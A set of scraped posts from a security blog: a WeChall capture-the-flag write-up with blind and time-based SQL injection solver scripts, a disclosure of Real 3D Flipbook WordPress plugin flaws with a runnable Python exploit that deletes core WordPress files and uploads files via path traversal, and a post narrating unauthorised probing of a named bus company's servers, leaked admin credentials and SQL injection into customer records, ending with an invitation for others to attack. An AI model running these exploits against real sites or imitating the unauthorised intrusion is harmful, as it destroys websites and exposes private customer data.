# Requirements : Python 3.4.x or Higher, Requests Module
#
import re, os, sys, getpass
try:
  import requests
except:
  exit('[-] Importing Requests module failed')

class weChall:
  '''http://www.wechall.net'''

  loginUrl  = 'http://www.wechall.net/login'
  challUrl  = 'http://www.wechall.net/challenge/blind_light/index.php'

  def __init__(self, username, password):
    self.login(username, password)

  def login(self, username, password):
    s = requests.Session()
    r = s.get(self.loginUrl)
    r = s.post(self.loginUrl, data = {'username' : username, 'password' : password, 'login' : 'Login'})
    if 'Welcome back to WeChall' in r.text:
      print('[+] Login Successful')
      print('[+] Resetting attempt counter')
      r = s.get(self.challUrl + '?reset=me')
      c = r.request.headers['Cookie']
      self.Cookie = c
    else:
      exit('[-] Login Failed')

class solveChall(weChall):
  '''Extending weChall login class'''

  trueStr   = 'Welcome back, user.'
  falseStr  = 'Your password is wrong, user.'

  def inject(self):
    mySol = ''
    print('[+] Solving [Wechall.net] Blinded by the Light')
    for x in range(1, 33):
      for y in range(1, 5):
        payload = '\' or substr(lpad(conv(substr(password,' + str(x) + ',1),16,2),4,\'0\'),' + str(y) + ',1)-- -'
        data    = {'injection' : payload, 'inject' : 'Inject'}
        try:
          r     = requests.post(self.challUrl, data = data, headers = {'Cookie' : self.Cookie }, timeout = 30)
        except:
          exit('[-] Please check your internet connection')
        if self.trueStr in r.text:
          attempt = re.search('You would now be logged in after (.+?) attempts', r.text).group(1)
          mySol   = mySol + '1'
        elif self.falseStr in r.text:
          attempt = re.search('This was your (.+?)\. attempt', r.text).group(1)
          mySol   = mySol + '0'
      clear   = os.system('cls' if os.name == 'nt' else 'clear')
      print('[+] Attempts : ' + attempt)
      print('[+] Solution : ' + hex(int(mySol,2))[2:])
      print('\nPlease Wait .. ')
      sys.stdout.flush()
    print('[+] Done')
    return hex(int(mySol,2))[2:]

  def submitSolution(self, myHash):
    r = requests.post(self.challUrl, data = {'thehash' : myHash, 'mybutton' : 'Enter'}, headers = {'Cookie' : self.Cookie }, timeout = 30)
    if 'Your answer is correct' in r.text:
      print('[+] Challenge completed successfully.')
    else:
      print('[-] Something went wrong. Please try again.')

def main():
  u = input('Enter WeChall Username: ')
  p = getpass.getpass('Enter WeChall Password: ')
  a = solveChall(u, p)
  solution = a.inject()
  a.submitSolution(solution)

if __name__ == '__main__':
  try:
    main()
  except KeyboardInterrupt:
    exit('[-] CTRL-C detected.')

# End

```

This script automatically makes a login session for our wechall account, resets the attempt counter and solves the challenge.

![Script Execution](../assets/images/blog/posts/solution-blinded-by-the-light/blinded3.png)

![Script Execution](../assets/images/blog/posts/solution-blinded-by-the-light/blinded4.png)

![Script Execution](../assets/images/blog/posts/solution-blinded-by-the-light/blinded5.png)

## Challenge 2 – Blinded by the Lighter

Let's take a look at the rules. We have to perform blind SQL injection to extract an MD5 hash (32 characters) 3 times in a row in 27 minutes i.e. 9 minutes/hash using max 33 queries/hash.

> I admit it's fatally dangerous, but I'd get to fly around like Iron Man. – [The Martian](https://www.imdb.com/title/tt3659388/)

I have realized that I'd have to play with MySQL `Sleep()` function here. For those of you who don't know, `Sleep()` creates delay for the number of seconds given by the duration argument and pauses the execution. We can actually get one character per query using `Sleep()`. For example, I can ask the database if the first character of the password is `a`, sleep for 1 second, if it's `b`, sleep for 2 seconds, if it's `c`, sleep for 3 seconds and so on. And by measuring the execution time we can easily figure out the results. But there's a reason why people don't use it. There's no way we can measure accurate time from the users end unless you have super fast internet with less than 20 ms ping delay from the target (like you're on the same LAN segment). But luckily, I don't have to measure the execution time because it's already given at the bottom of the page. Wechall shows some server side values in the footer of every page like total execution time, number of queries executed, number of modules loaded etc.

![Execution Time](../assets/images/blog/posts/solution-blinded-by-the-light/blinded6.png)

So, considering all the dynamics and making some minor adjustments, here's my code.

```
#
# [Wecall.net] Blinded by the Lighter - Part 2
# Solution by MakMan
# //mukarramkhalid.com/solution-blinded-by-the-light/
# Requirements : Python 3.4.x or Higher, Requests Module
#
import re, os, sys, time, getpass
try:
  import requests
except:
  exit('[-] Importing Requests module failed')

class weChall:
  '''http://www.wechall.net'''

  loginUrl  = 'http://www.wechall.net/login'
  challUrl  = 'http://www.wechall.net/challenge/blind_lighter/index.php'

  def __init__(self, username, password):
    self.login(username, password)

  def login(self, username, password):
    s = requests.Session()
    r = s.get(self.loginUrl)
    r = s.post(self.loginUrl, data = {'username' : username, 'password' : password, 'login' : 'Login'})
    if 'Welcome back to WeChall' in r.text:
      print('[+] Login Successful')
      print('[+] Closing Side bar for faster page load')
      r = s.get('http://www.wechall.net/index.php?mo=WeChall&me=Sidebar2&rightpanel=0')
      print('[+] Resetting attempt counter')
      r = s.get(self.challUrl + '?reset=me')
      c = r.request.headers['Cookie']
      self.Cookie = c
    else:
      exit('[-] Login Failed')

class solveChall(weChall):
  '''Extending weChall login class'''

  charMap   = ['', 'a', 'b', 'c', 'd', 'e', 'f', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
  timeStep  = 1.5

  def makePayload(self, mchar):
    p = '\' or \'\'=\'\' and ('
    for i in range(1, 17):
      p = p + ' if(substr(password,'+ str(mchar) +',1)=\''+ self.charMap[i] +'\', sleep('+ str(i * self.timeStep) +'), 1) and'
    p = p + ' 1)-- -'
    return p

  def inject(self, position):
    print('[+] Solving [Wechall.net] Blinded by the Lighter')
    payload = self.makePayload(position)
    headers = {'Cookie' : self.Cookie}
    data    = {'injection' : payload, 'inject' : 'Inject'}
    try:
      r = requests.post(self.challUrl, headers = headers, data = data, timeout = None)
    except:
      exit('[-] Please check your internet connection')
    phpTime = float(re.search('PHP Time: (.+?)s', r.text).group(1))
    return self.charMap[int(phpTime/1.5)]

  def submitSolution(self, attempt):
    print('[+] Submiting Solution ' + str(attempt) + ' ..')
    headers = {'Cookie' : self.Cookie}
    data    = {'thehash' : self.passHash, 'mybutton' : 'Enter'}
    try:
      r = requests.post(self.challUrl, headers = headers, data = data)
    except:
      exit('[-] Please check your internet connection')
    if 'Wow, you were able to retrieve the correct hash' in r.text:
      print('[+] Successful')
      print('[+] Starting Challenge '+ str(attempt + 1) +'/3')
    elif 'Your answer is correct' in r.text:
      print('[+] Challenge completed successfully')
    else:
      exit('[-] Something went Wrong. Please try again.')

  def solve(self):
    print('[+] Starting Injection')
    print('[+] Please wait .. ')
    time.sleep(3)
    for j in range(1, 4):
      self.passHash = ''
      for i in range(1, 33):
        self.passHash += self.inject(i)
        clear = os.system( 'cls' if os.name == 'nt' else 'clear' )
        print('[+] Challenge '+ str(j) +'/3')
        print('[+] Password hash : ' + self.passHash)
        sys.stdout.flush()
      self.submitSolution(j)

def main():
  u = input('Enter WeChall Username: ')
  p = getpass.getpass('Enter WeChall Password: ')
  a = solveChall(u, p)
  solution = a.solve()

if __name__ == '__main__':
  try:
    main()
  except KeyboardInterrupt:
    print('\n[-] Ctrl-c detected.')

#

```

I've chosen the time step of `1.5` seconds on line 41. So, the last character in my `charMap` (i.e. '9') will take maximum 16 x 1.5 = 24 seconds. Now, If I consider the worst possible scenario that every character in my password hash is '9' (Which will never be the case), it'll take 24 x 32 (MD5 Length) = 768 seconds = 12.8 Minutes in worst case. So I guess, 1.5 seconds won't be the ideal time step but it'll do just fine. If you have good internet connection (and you're feeling lucky), you can always change this value on line 41 and reduce it to 1 second. I had to run this script 2 – 3 times to make it work (because my internet sucks) but eventually it worked.

![Script Execution](../assets/images/blog/posts/solution-blinded-by-the-light/blinded7.png)

![Script Execution](../assets/images/blog/posts/solution-blinded-by-the-light/blinded8.png)

![Script Execution](../assets/images/blog/posts/solution-blinded-by-the-light/blinded10.png)

![Script Execution](../assets/images/blog/posts/solution-blinded-by-the-light/blinded12.png)

> At some point, everything's gonna go south on you… everything's going to go south and you're going to say, this is it. This is how I end. Now you can either accept that, or you can get to work. That's all it is. You just begin. You do the math. You solve one problem… and you solve the next one… and then the next. And If you solve enough problems, you get to come home. All right, questions? – [The Martian](https://www.imdb.com/title/tt3659388/)

## GitHub Repository

* [[Wechall.net] Solutions by Mukarram Khalid](https://github.com/mukarramkhalid/WeChall)

[[WordPress] Real 3D Flipbook Plugin Exploit →](https://mukarramkhalid.com/wordpress-real-3d-flipbook-plugin-exploit "Newer Post: [WordPress] Real 3D Flipbook Plugin Exploit")

* © [Mukarram Khalid](https://mukarramkhalid.com "Mukarram Khalid") 2024.



=== Content from mukarramkhalid.com_40db73b8_20250125_173122.html ===

[# Mukarram Khalid](/ "Mukarram Khalid")

[About](/about "About")
[Contact](/contact "Contact")

* [About](/about "Mukarram Khalid About")
* [Contact](/contact "Mukarram Khalid Contact")

![[WordPress] Real 3D Flipbook Plugin Exploit cover image](../assets/images/blog/posts/wordpress-real-3d-flipbook-plugin-exploit/flipbook2.png)
# [WordPress] Real 3D Flipbook Plugin Exploit

Mukarram Khalid • July 3, 2016

[php](/category/php "View posts in php")
[wordpress](/category/wordpress "View posts in wordpress")
[exploits](/category/exploits "View posts in exploits")
[python](/category/python "View posts in python")
## Introduction

Real 3D Flipbook is a wordpress plugin which uses Web Graphics Library to create 3D flip books. We can upload PDF files or JPEG images and it will automatically make an interactive flipbook for wordpress posts and pages. At the time of writing this post, the plugin costs $32 with $9.60 for extended 12 months support. You can find further details on the official [codecanyon](http://codecanyon.net/item/real3d-flipbook-wordpress-plugin/6942587) page.

## Vulnerabilities

The company I work for, bought this plugin few days ago and decided to use it on our wordpress blog for the company featured magazine. We don't install the plugins directly on our wordpress instance. We usually audit the code and add some tweaks first. That's where I come in.

While auditing this plugin, I found some critical vulnerabilities which can be exploited by an unauthenticated user and do some real damage to our wordpress installation. Here's the list of vulnerabilities:

* Delete any file or directory from the server (Unauthenticated)
* Upload images in Root directory (Unauthenticated)
* Cross Site Scripting (XSS) vulnerability

Let's take a look at these vulnerabilities individually.

### Delete Files or Directories (Unauthenticated)

This vulnerability exists in a file `wp-content/plugins/real3d-flipbook/includes/process.php`. Here's a code snippet from the file.

```
if (isset($_POST["deleteBook"]) && !empty($_POST["deleteBook"])) {
    $bookName = $_POST['deleteBook'];
    $dirPath = "../../../uploads/real3dflipbook/".$bookName;

    if (! is_dir($dirPath)) {
        throw new InvalidArgumentException("$dirPath must be a directory");
    }
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
        $dirPath .= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
        if (is_dir($file)) {
            self::deleteDir($file);
        } else {
            unlink($file);
        }
    }
    rmdir($dirPath);
}

```

This file was meant to be called within the scope of wordpress admin panel but it doesn't check for user authentication at all so, an unauthenticated user can call this file and pass POST parameters. On line 55, POST parameter `deleteBook` is assigned to a variable `$bookName` which further gets concatenated to `$dirPath`. Lines 58 – 60 make sure that the resulting path is a valid directory. On line 64, PHPs `glob()` function returns an array of filenames and directories matching the given pattern in `$dirPath`. From line 65 to 72, it loops through all the file paths and deletes them one by one. At the end of the loop, it deletes the parent directory by `rmdir($dirPath)`.

An end user can exploit this vulnerability and delete any wordpress file or directory by simply making a POST request to `process.php` with the POST data `deleteBook=../../../wp-includes/css` or `deleteBook=../../../wp-includes/customize`.

`self::deleteDir()` on line 67 may create some problem for us, as we're calling this file outside the class scope. So, we need to make sure that we never land on line 67, the best way is to delete the files in this specific order [wpFiles.json](https://mukarramkhalid.com/assets/files/wordpress-real-3d-flipbook-plugin-exploit/wpFiles.json). This order starts from the deepest directory with no other directories in it and then gradually moves to the parent directory thus always landing on `unlink()` or `rmdir()` on lines 69 and 72 respectively.

### Upload Images in Root Directory

This vulnerability also exists in file `wp-content/plugins/real3d-flipbook/includes/process.php`. Here's the code snippet.

```
if (isset($_POST["imgbase"]) && !empty($_POST["imgbase"])) {

    // get the image data
    $data = $_POST['imgbase'];
    $bookName = $_POST['bookName'];

    list($type, $data) = explode(';', $data);
    list(, $data) = explode(',', $data);
    $data = base64_decode($data);

    $booksFolder = "../../../uploads/real3dflipbook/";
    if (!file_exists($booksFolder)) {
        mkdir($booksFolder, 0777, true);
    }

    $bookFolder = "../../../uploads/real3dflipbook/".$bookName;
    if (!file_exists($bookFolder)) {
        mkdir($bookFolder, 0777, true);
    }

    $filename = $bookFolder."/".$_POST['pageName'].".jpg";
    // $thumbName = $bookFolder."/".$_POST['pageName']."_thumb.jpg";

    $file = $filename;

    // decode the image data and save it to file
    if (!file_put_contents($file, $data)){
        echo "failed";
    } else {
        echo "success";
    }
}

```

On line 5, the POST parameter `imageBase` expects the Base64 encoded image data. Something like `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIA...`. On line 6, POST parameter `bookName` determines the upload directory path. From line 14 to 26, it processes the image data, decodes it and creates the upload directories. It takes a POST parameter `pageName` which is used as the image filename and copies the image data to a JPG file on line 35. An end user can upload images directly in the root directory by simply making a POST request to `process.php`.

For example, this payload will upload an image `makman.jpg` in the root directory of the website `imgbase=data:image/png;base64,iVBORw0KGgoAAA...&bookName=../../../&pageName=makman`, and not to mention, with out any user authentication.

If the webserver is running PHP version prior to PHP 5.3, we can also leverage this vulnerability to code execution by uploading PHP files. PHP < 5.3 was vulnerable to Null Bytes injection/truncation attacks.

In that case, we can upload PHP files by changing our payload to `imgbase=data:image/png;base64,iVBOAAA..&bookName=../../../&pageName=makman.php%00`, which will result in `makman.php` created in the root directory with our input data `imgbase` as the file contents.

### Cross Site Scripting (Reflected XSS)

This vulnerability exists in `wp-content/plugins/real3d-flipbook/includes/flipbooks.php` where unsanitized user input is directly echoed on the page. An end user can exploit this vulnerability by simply making a GET request to `flipbooks.php` with GET parameters `action=delete&bookId=<script>alert(/makman/)</script>`.

## Exploit Code

A simple search for Google dork `"wp-content/uploads/real3dflipbook"` resulted in 13K websites using Real 3D Flipbook plugin.

![Google Search](../assets/images/blog/posts/wordpress-real-3d-flipbook-plugin-exploit/flipbook3.png)

Here comes the fun part, I've coded a POC in Python which exploits all these vulnerabilities for the given website. It deletes all the important files in `wp-content/` and `wp-admin/` thus breaking the wordpress installation. Then, it uploads an image `makman.jpg` in the root directory of the website and finally checks the XSS payload. Here's the code.

[[+] GitHub Repository](https://github.com/mukarramkhalid/wordpress-real-3d-flipbook-exploit)

```
#########################################################################
# [+] [POC][Exploit] CodeCanyon Real3D FlipBook WordPress Plugin
# [+] http://codecanyon.net/item/real3d-flipbook-wordpress-plugin/6942587
# [+] Multiple Vulnerabilities Found by: Mukarram Khalid
# [+] https://mukarramkhalid.com/wordpress-real-3d-flipbook-plugin-exploit/
# [+] Requirements : Python 3.4.x or higher, Requests Module
# [+] Timeline: Vuln Found : 01-07-2016, Reported to Vendor: 03-07-2016
########################################################################

import os, json, base64
try:
    import requests
except:
    exit('[-] Importing Requests module failed')

class wpFlipbook:
    ''' Wordpress 3d flipbook plugin exploit '''

    headers  = {'User-agent' : 'Mozilla/11.0'}
    payload1 = {'deleteBook' : ''}
    payload2 = {'imgbase' : '', 'bookName' : '../../../', 'pageName' : 'makman'}
    payload3 = {'action' : 'delete', 'bookId' : '<script>alert(/makman/)</script>'}
    imageUrl = 'https://mukarramkhalid.com/assets/images/m.png'
    wpFilesUrl = 'https://mukarramkhalid.com/assets/files/wordpress-real-3d-flipbook-plugin-exploit/wpFiles.json'

    def __init__(self, url):
        url = url.rstrip('/')
        if 'http://' in url or 'https://' in url:
            self.url = url
        else:
            self.url = 'http://' + url

    def http(self, url, data = {}, post = False):
        try:
            if post:
                r = requests.post(url, data = data, headers = self.headers, timeout = 20)
            else:
                r = requests.get(url, params = data, headers = self.headers, timeout = 20)
        except:
            exit('[-] Something went wrong. Please check your internet connection')
        return r

    def deleteFiles(self):
        print('[+] Loading Wordpress file structure')
        r = self.http(self.wpFilesUrl)
        wpFiles = json.loads(r.text)
        print('[+] Wordpress File structure loaded successfully')
        print('[+] Creating directory real3dflipbook')
        r = self.http(self.url + '/wp-content/plugins/real3d-flipbook/includes/process.php', {'imgbase' : 'makman'}, True)
        print('[+] Deleting Files from wp-includes/ & wp-admin/')
        for wpFile in wpFiles['wpFiles']:
            print('    [+] Deleting File ' + wpFile)
            self.payload1['deleteBook'] = wpFile
            r = self.http(self.url + '/wp-content/plugins/real3d-flipbook/includes/process.php', self.payload1, True)
        print('[+] Files have been deleted successfully')

    def uploadImage(self):
        print('[+] Loading image file')
        r = self.http(self.imageUrl)
        encodedImage = base64.b64encode(r.content)
        self.payload2['imgbase'] = ';,' + encodedImage.decode('utf-8')
        print('[+] Uploading image file in target root directory')
        r = self.http(self.url + '/wp-content/plugins/real3d-flipbook/includes/process.php', self.payload2, True)
        print('[+] Image has been uploaded here ' + self.url + '/' + self.payload2['pageName'] + '.jpg')

    def xss(self):
        print('[+] Checking XSS payload')
        r = self.http(self.url + '/wp-content/plugins/real3d-flipbook/includes/flipbooks.php', self.payload3)
        if self.payload3['bookId'] in r.text:
            print('[+] Found XSS here :')
            print('    [+] ' + self.url + '/wp-content/plugins/real3d-flipbook/includes/flipbooks.php?action=' + self.payload3['action'] + '&bookId=' + self.payload3['bookId'])

#########################################################################################################

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    tabs = '    '
    print(tabs + '*******************************************************************')
    print(tabs + '* [+] [POC][Exploit] CodeCanyon Real3D FlipBook WordPress Plugin  *')
    print(tabs + '* [+] Multiple Vulnerabilities Found by:                          *')
    print(tabs + '* [+] https://mukarramkhalid.com                                  *')
    print(tabs + '*******************************************************************\n\n')

def main():
    banner()
    url = input('[+] Enter Url\n[+] E.g. http://test.com or http://test.com/wordpress\n[+] ')
    exploit = wpFlipbook(url)
    exploit.deleteFiles()
    exploit.uploadImage()
    exploit.xss()
    print('[+] Done')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit('\n[-] CTRL-C detected.\n')
# End

```

After executing this exploit, the wordpress site doesn’t load because the exploit deletes all the files in `wp-includes/`.

![Files Deleted](../assets/images/blog/posts/wordpress-real-3d-flipbook-plugin-exploit/flipbook9.png)

![Exploit Execution](../assets/images/blog/posts/wordpress-real-3d-flipbook-plugin-exploit/flipbook4.png)

![Deleting Files](../assets/images/blog/posts/wordpress-real-3d-flipbook-plugin-exploit/flipbook5.png)

![Exploit Completed](../assets/images/blog/posts/wordpress-real-3d-flipbook-plugin-exploit/flipbook6.png)

![File Uploaded](../assets/images/blog/posts/wordpress-real-3d-flipbook-plugin-exploit/flipbook7.png)

![XSS](../assets/images/blog/posts/wordpress-real-3d-flipbook-plugin-exploit/flipbook8.png)

## Vulnerability Timeline

* **Vulnerability Found:** 2016-07-01
* **Reported to Vendor:** 2016-07-03
* **Public Disclosure:** 2016-07-03

## Advisories

* <https://www.exploit-db.com/exploits/40055/>
* <https://wpvulndb.com/vulnerabilities/8536>

# CVEs

* [CVE-2016-10965](https://www.cve.org/CVERecord?id=CVE-2016-10965)
* [CVE-2016-10966](https://www.cve.org/CVERecord?id=CVE-2016-10966)
* [CVE-2016-10967](https://www.cve.org/CVERecord?id=CVE-2016-10967)

[← Blinded by the Light](https://mukarramkhalid.com/solution-blinded-by-the-light "Older Post: Blinded by the Light")

[The Color Of My Hat →](https://mukarramkhalid.com/the-color-of-my-hat "Newer Post: The Color Of My Hat")

* © [Mukarram Khalid](https://mukarramkhalid.com "Mukarram Khalid") 2024.



=== Content from mukarramkhalid.com_7668d0f0_20250126_103745.html ===

[# Mukarram Khalid](/ "Mukarram Khalid")

[About](/about "About")
[Contact](/contact "Contact")

* [About](/about "Mukarram Khalid About")
* [Contact](/contact "Mukarram Khalid Contact")

# The Color Of My Hat

Mukarram Khalid • April 18, 2017

[sqli](/category/sqli "View posts in sqli")
> Somebody has to wear the black hat and give the audience someone to shake their fists at. They want someone to hate. And if that's what you want to pay me to do, I'm happy to do it! – Jane Elliot

If you're not familiar with the concept of `Hats` in hacking, you're probably at the wrong place. Or may be, you just have a good taste in hats. In either case, I want you to sit tight and read this through. It won't be boring and you'll get along just fine. I promise.

I've had my good share of `Hats`. Black, white or sometimes a blackish shade of grey. The darker it gets, the more fun you have. I read somewhere `Curiosity is Fun` . I'm not in total agreement with this statement. It does lead to certain places where we would never go normally. Few weeks ago, my curiosity was piqued by an article written by some fellow researchers. This article was about a security vulnerability where an end user was able to buy free tickets and travel all over Pakistan via renowned travelling company, [Daewoo Express](http://www.daewoo.com.pk/). It was a good read which concluded that the vulnerability was fixed.

`Security is just an illusion`. A cliche that has been overused so much that it has lost its metaphorical impact. Let me take you on a journey which may restore the intended meaning.

The first few clicks on the website show an IP address. A few more random clicks, and I have a total of three different IP addresses. I won't check if there are more but, three are more than enough to satisfy the hunger for now. Each IP address is listening on a different port, which suggests that there may be more services running on other ports.

![IP Address](../assets/images/blog/posts/the-color-of-my-hat/daewoo-ip.png)

Let's choose one of these IP addresses `221.120.222.68` and see if we can find more ports.

![Port Scan](../assets/images/blog/posts/the-color-of-my-hat/daewoo-portscan.png)

Who doesn't like ports? Ports are the endpoints of communication and this IP address has a lot of 'em. `HTTPD` service is running on about 60 different ports. The default port is for the ticketing portal where an end user can select routes, departure times, locations etc. Do you want to see what's running on other HTTPD ports? I know, I do. First port `8001` shows a WSDL (Web Services Description Language) page.

> WSDL is an XML format for describing network services as a set of endpoints operating on messages containing either document-oriented or procedure-oriented information. The operations and messages are described abstractly, and then bound to a concrete network protocol and message format to define an endpoint. – [w3.org/TR/wsdl](https://www.w3.org/TR/wsdl/)

Why on earth would someone expose their WSDL page publicly with the complete list of API endpoints and operations. And not just that, but a complete user interface to invoke these web services and see the actual results. No authentication, no secret key, no token?

![WSDL](../assets/images/blog/posts/the-color-of-my-hat/wsdl1.png)

![Get Booking](../assets/images/blog/posts/the-color-of-my-hat/wsdl2.png)

Wait a minute! What if there are some other ports with these publicly accessible WSDL pages exposing critical API endpoints. This is getting interesting. I should keep looking. The very next port in the list `8002` is another WSDL page for TMS (Ticket Management System). These end points look far more interesting.

![Interesting Endpoints](../assets/images/blog/posts/the-color-of-my-hat/wsdl3.png)

Let's try one of these endpoints with random input values and see if it works.

![Get Booked Data](../assets/images/blog/posts/the-color-of-my-hat/wsdl4.png)

```
[
  {
    "BOOKM_NAME": "M YASIN",
    "BOOKM_PHONE": "__REMOVED__",
    "BOOKM_GENDER": "M",
    "DEPARTURETERMINAL": "LAHORE",
    "DEP_INIT": "LHR",
    "ARRIVALTERMINAL": "RAWALPINDI",
    "ARRIV_INIT": "RWP",
    "BOOKM_TERMINAL": 44,
    "BOOKM_CODE": ___REMOVED__,
    "BOOKM_SITE": 69,
    "BOOKM_DATE": "20170117",
    "BOOKM_TIME": "0600",
    "BOOKM_BOOKNO": "__REMOVED__",
    "BOOKM_SCHEDULE": 261378,
    "BOOKM_TIMECODE": "1",
    "BOOKM_ROUTE": 5353,
    "BOOKM_ROUTECHECK": "10000000000000",
    "BOOKM_DEPARTURE": 1,
    "BOOKM_ARRIVAL": 22,
    "BOOKM_FARE": 1250,
    "BOOKM_SEATS": "12",
    "BOOKM_QTY": 1,
    "BOOKM_AMOUNT": 1250,
    "BOOKM_SET_SEATS": "12",
    "BOOKM_SET_QTY": 1,
    "BOOKM_SET_AMOUNT": 1250,
    "BOOKM_CNIC": null,
    "BOOKM_REMARK": null,
    "BOOKM_MEMBERSHIP": null,
    "BOOKM_CANCEL": 0,
    "BOOKM_ISSUED": "N",
    "BOOKM_CREATE_DATE": "/Date(1484573121000)/",
    "BOOKM_CREATE_USER": "HR766",
    "BOOKM_SYNC": "2",
    "BOOKM_YYMM": "201701",
    "BOOKM_CREATE_IP": "10.20.27.246",
    "BOOKM_CREATE_PC": "DKCCC031197",
    "BOOKM_MEMBERID": null,
    "BOOKM_PPCNUMBER": null,
    "BOOKM_LOCATION": null,
    "BOOKD_TERMINAL": 44,
    "BOOKD_CODE": __REMOVED__,
    "BOOKD_SEAT": 12,
    "BOOKD_CANCEL_YN": "N",
    "BOOKD_CANCEL_DATE": null,
    "BOOKD_CANCEL_USER": null,
    "BOOKD_SYNC": "1",
    "BOOKD_GENDER": null
  }
]

```

I can see the fun part already. Take a look at this endpoint with no input parameters. I just have to hit that invoke button. How convenient!

![Get User](../assets/images/blog/posts/the-color-of-my-hat/wsdl5.png)

This endpoint results in plain text admin credentials of a portal and that portal is running on the very next port.

![Admin Credentials](../assets/images/blog/posts/the-color-of-my-hat/wsdl6.png)

![Dashboard](../assets/images/blog/posts/the-color-of-my-hat/wsdl7.png)

Please be noted that up till this point, we've just looked around. We haven't dealt with payloads, exploits or vulnerabilities yet. When you have 20 different applications running on different ports with publicly exposed APIs, vulnerabilities are bound to exist. I'm curious to know, how far I can go by just looking around.

![Advanced Ticketing](../assets/images/blog/posts/the-color-of-my-hat/wsdl10.png)

Some of these ports have dashboards and portals with absolutely no authentication at all.

![User Data](../assets/images/blog/posts/the-color-of-my-hat/wsdl8.png)

![Vehicle Management System](../assets/images/blog/posts/the-color-of-my-hat/wsdl9.png)

Here's another critical endpoint which shows plain text admin credentials. All I have to do is, click a button.

![Get All Admins](../assets/images/blog/posts/the-color-of-my-hat/wsdl11.png)

![Admin Users](../assets/images/blog/posts/the-color-of-my-hat/wsdl12.png)

And it leads to another portal.

![Partner Portal](../assets/images/blog/posts/the-color-of-my-hat/wsdl13.png)

![Partner Profile](../assets/images/blog/posts/the-color-of-my-hat/wsdl14.png)

Let's just take a moment here. How secure is secure enough? Consider a locked door. What if someone picks the lock? What if he breaks the door?

What if there's no lock? What if there's no door at all? What if it's just an open hallway with all your personal stuff lying around? I have personally traveled via Daewoo Express. Can I find my personal details in their database? Let's give it a try. A simple SQL Injection vulnerability shows that the back end DBMS is `Oracle 11g Enterprise Edition` running on a 64-bit Windows server.

![SQL Injection](../assets/images/blog/posts/the-color-of-my-hat/daewo-sqli-2.png)

The tickets table shows more than `11 Million` records and a simple count query for my phone number shows `58` records.

![My Data](../assets/images/blog/posts/the-color-of-my-hat/daewo-sqli-3.png)

`Security is just an illusion`. I'm sure you're having second thoughts now. I heard that the fellow researchers had hard time dealing with Daewoo's administration. I'm just wondering, why would I go through all that trouble? I'll just leave this article here and wait for the kids to do their part. I know it'll have consequences but I don't care. I guess I'm wearing a different `Hat` today.

[← [WordPress] Real 3D Flipbook Plugin Exploit](https://mukarramkhalid.com/wordpress-real-3d-flipbook-plugin-exploit "Older Post: [WordPress] Real 3D Flipbook Plugin Exploit")

[Hack The Box - Cyber Apocalypse 2022 Writeups →](https://mukarramkhalid.com/hack-the-box-cyber-apocalypse-2022-writeups "Newer Post: Hack The Box - Cyber Apocalypse 2022 Writeups")

* © [Mukarram Khalid](https://mukarramkhalid.com "Mukarram Khalid") 2024.


